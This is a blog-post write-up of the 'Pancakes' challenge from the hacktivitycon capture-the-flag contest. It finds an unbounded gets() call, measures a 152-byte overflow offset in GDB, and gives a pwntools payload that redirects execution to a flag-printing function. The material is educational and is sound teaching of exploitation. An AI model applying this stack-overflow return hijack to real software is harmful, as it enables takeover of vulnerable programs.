---
layout: post
title:  "Pancakes Writeup"
date:   2020-09-16 22:00:00 -0700
categories: 
    - "cybersecurity"
    - "binary_exploitation"
author: "Joshua Salzedo"
---
Not too long ago I participated in a CTF by the name of [`hacktivitycon`](https://www.hackerone.com/hacktivitycon).
This CTF had multiple faces to it and was of the Jepordy-style of Capture the Flags.

One of the categories was `Binary Exploitation`, and one of the questions was `Pancakes`.
The task of pancakes was simple, given a URL pointing at the gameserver to netcat onto, capture the flag.

They were kind enough to provide the binary as well, which we will look at shortly.

# The tools used for this writeup
- [Ghidra](https://github.com/NationalSecurityAgency/ghidra)
- [GEF](https://github.com/hugsy/gef)
- [Pwntools](http://docs.pwntools.com/en/latest/install.html)
- [objdump](https://www.gnu.org/software/binutils/)

# Summary
The High level steps taken here:
1. Determine vulnerable code 
2. Identify appropriate exploit (Buffer overflow)
3. Evaluate conditions of successful exploitation (Offset)
4. Determine target of successful exploitation (Return to arbitrary function)
5. Craft payload (Utilizing `offset` and the arbitrary return)
6. Exploit.



# The Interface
Before being able to exploit the weakness to capture the flag, 
it helps to take stock of what it is, precicely, the target is.

As the binary was provided, the simplest path is probably to just:tm: run the binary in a sandbox and use that for analysis.

```
root@sandstorm:/project# ./pancakes 
Welcome to the pancake stacker!
How many pancakes do you want?
```
It provides a prompt here, meaning there is user input. 
Which means there is probably a string buffer being read into.

Providing a value doesn't seem to do anything specific, normal runtime always has the same result. 
The program renders a small animation and then exits.

```
root@sandstorm:/project# ./pancakes 
Welcome to the pancake stacker!
How many pancakes do you want?
2
Cooking your cakes.....
Smothering them in butter.....
Drowning them in syrup.....
They're ready! Our waiters are bringing them out now...
        _____________
       /    ___      \
      ||    \__\     ||
      ||      _      ||
      |\     / \     /|
      \ \___/ ^ \___/ /
      \\____/_^_\____//_
    __\\____/_^_\____// \
   /   \____/_^_\____/ \ \
  //                   , /
  \\___________   ____  /
               \_______/

root@sandstorm:/project# 
```

Thats all we have to work with on the interface, so the only attack surface for this problem is that user input.

# The Binary
The CTF also provides the `pancakes` binary to us, which when analyzed can shed a lot of light on what needs to be done.

For the analysis, I will be using [Ghidra](https://ghidra-sre.org/)

Importing the binary into Ghidra reveals its an x86 ELF executable. No surprises there.

The next step is to browse the Symbol Tree, specifically as a means to get 
to the `main` function. 

- Note: one look at `_start` indicates a libc entry point, thus it can be deduced a `main` symbol must exist.
- Note: there are other symbols of interest in the symbol tree, more on those in a little bit!

![listing_2](/assets/pancakes_2.png)

## `main`
Analyzing main we get a C translation that looks roughly like

```c
undefined8 main(void)

{
  char local_98 [128];
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  
  local_18 = 0;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("Welcome to the pancake stacker!");
  puts("How many pancakes do you want?");
  gets(local_98);
  local_18 = atoi(local_98);
  printf("Cooking your cakes");
  local_c = 0;
  while (local_c < 5) {
    putchar(0x2e);
    usleep(50000);
    local_c = local_c + 1;
  }
  putchar(10);
  printf("Smothering them in butter");
  local_10 = 0;
  while (local_10 < 5) {
    putchar(0x2e);
    usleep(50000);
    local_10 = local_10 + 1;
  }
  putchar(10);
  printf("Drowning them in syrup");
  local_14 = 0;
  while (local_14 < 5) {
    putchar(0x2e);
    usleep(50000);
    local_14 = local_14 + 1;
  }
  putchar(10);
  puts("They\'re ready! Our waiters are bringing them out now...");
  puts(g_pancakes);
  return 0;
}
```

## 1: The vulnerability in main
If we look closely at this C decompilation, there is a call to `gets`!
```c
  char local_98 [128];
  // ...
  puts("Welcome to the pancake stacker!");
  puts("How many pancakes do you want?");
  gets(local_98);
  local_18 = atoi(local_98);
```
### 2: What's so special about `gets`?
`gets` is a c standard library function for fetching a string from user input.
More importantly, It **doesn't do any bounds checking**.

Citing from the [c++ reference](http://www.cplusplus.com/reference/cstdio/gets/), 
> Notice that gets is quite different from fgets: not only gets uses stdin as source, but it does not include the ending newline character in the resulting string and does not allow to specify a maximum size for str (which can lead to buffer overflows).

Perfect! the binary makes a call to `gets`, which is susceptible to buffer overflows! 
 - We also know the size of the buffer is 128 bytes, so writing 127(plus newline) characters will trigger an overflow.
 
# 3: Testing the buffer overflow
 We now know that a buffer overflow is *possible* on the STDIN to `pancakes` 
 by writing enough bytes, 
 our next step is to figure out exactly what needs to be written to get the 
 program to do something it wasn't exactly supposed to do: divulge the flag. 
 
## Determine how many bytes it takes to overwrite the Stack pointer (RSP)
If we can overwrite the RSP, we can perform a return to an arbitrary function.

For this load the `pancakes` binary into GDB, the GEF plugin will be utilized in this step.

We will use GEF's pattern creation tool to create a unique string we can shove into the STDIN.
 - the pattern is sufficiently unique to tell us a critical detail: the `offset`
 - the `offset` is "how many bytes" need to be written before we overwrite the target piece of memory: the RSP.
 
 Since we know we need at least 128 bytes to trigger the overflow, We will likely need to generate at least 200 bytes to be sure we find the correct offset.
 ```bash
root@sandstorm:/project# gdb -q ./pancakes
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 9.1 using Python engine 3.8
Reading symbols from ./pancakes...
(No debugging symbols found in ./pancakes)
(gdb) pattern create 200
[+] Generating a pattern of 200 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'

```
Copy this string to the clipboard, one does not simply write 200 bytes of specific structure by hand without making errors ;)

Next, run `pancakes` and paste in the STDIN buffer

![listing_3](/assets/pancakes_3.png)


Naturally, the program died from a `SIGSEGV`, aka a Segmentation Fault.

This is fine for now, whats important is the string thats in the `$rsp` register!

Just as we used `pattern create` to produce the original string, use `pattern search` to determine the offset.

Copy-paste the string value of `$rsp` into the gdb command line:
```
(gdb) pattern search taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Searching 'taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
[+] Found at offset 152 (big-endian search) 
```
- offset `152` write this down, it will be important later!

## 4: The arbitrary function to return to
The necessary offset has been determined, now we need to figure out where to 
redirect program flow.

The classical, but somewhat complicated route, is to pull off an exploit 
known as ["Return-to-LibC"](https://en.wikipedia.org/wiki/Return-to-libc_attack) 
to pop a shell, however this binary provides a simpler way of capturing the flag.

Looking in the symbol table, there is this odd function `secret_recipe`. 
 
Disassembly for this function is provided below:
```c

void secret_recipe(void)

{
  char data [144];
  FILE *ifile_handle;
  size_t data_len;
  
  data_len = 0;
  ifile_handle = fopen("flag.txt","r");
  data_len = fread(data,1,0x80,ifile_handle);
  data[data_len] = '\0';
  puts(data);
  return;
}
```

How convenient, there is a function here that prints out the flag!

Instead of needing to go through the complexity of ROP'ing our way into libc for 
a shell, simply redirect the program into `secret_recipe`!

### Obtaining the address of `secret_recipe`
The last big piece of this puzzle is obtaining a pointer to this function.

Its possible to get this out of Ghidra, but its not immediately obvious so I 
prefer to use a different tool: `objdump`.

Dump the symbol table of `pancakes` and filter it against `secret_recipe`:
```bash
root@sandstorm:/project# objdump ./pancakes -t | grep secret
000000000040098b g     F .text	0000000000000071              secret_recipe

```
The first column of the output is the address, `0x000000000040098b`.


# 5: Putting together the pieces.
To recap, from the previous steps it was determined that:
- A buffer overflow vulnerability exists on the STDIN.
- The minimum number of bytes (`offset`) to successfully exploit this vulnerability is `152`.
- Forcing `pancakes` to call the function `secret_recipe` will divulge the flag.
- The address of `secret_recipe` is `0x000000000040098b`.

Putting all this together, its time to craft the payload.

The following code snippets are Python code written against `pwntools`, see [Tools](#the-tools-used-for-this-writeup).

```python
import pwn  # Pwntools library

# obtained from GDB hackery
OFFSET = 152

# obtained from reverse-engineering / inspecting binary's symbol table
SECRET_RECIPE_ADDR = 0x0040098b

```
When building buffer overflow payloads, its common to use the letter `A` as a filler byte, though any byte will do.

```python
# fill STDIN with a standard byte until we reach desired overflow, thus overwriting the right register...
payload = b"A"*OFFSET
# Emit base address of secret_recipe such that the process will return into it.
payload += pwn.p64(SECRET_RECIPE_ADDR)


```
The payload is now built, using `A` to fill in `offset` bytes, then writing the 64 bit pointer of `secret_recipe` to the end of the payload.

This will cause the pointer to overwrite the correct CPU register and redirect program flow.

All thats left here to the reader is to emit `payload` to the process, which `pwntools` [has a method for.](https://docs.pwntools.com/en/latest/tubes.html#pwnlib.tubes.tube.tube.sendline)

# Proof of work
![listing_2](/assets/pancakes_flag_capture.png)
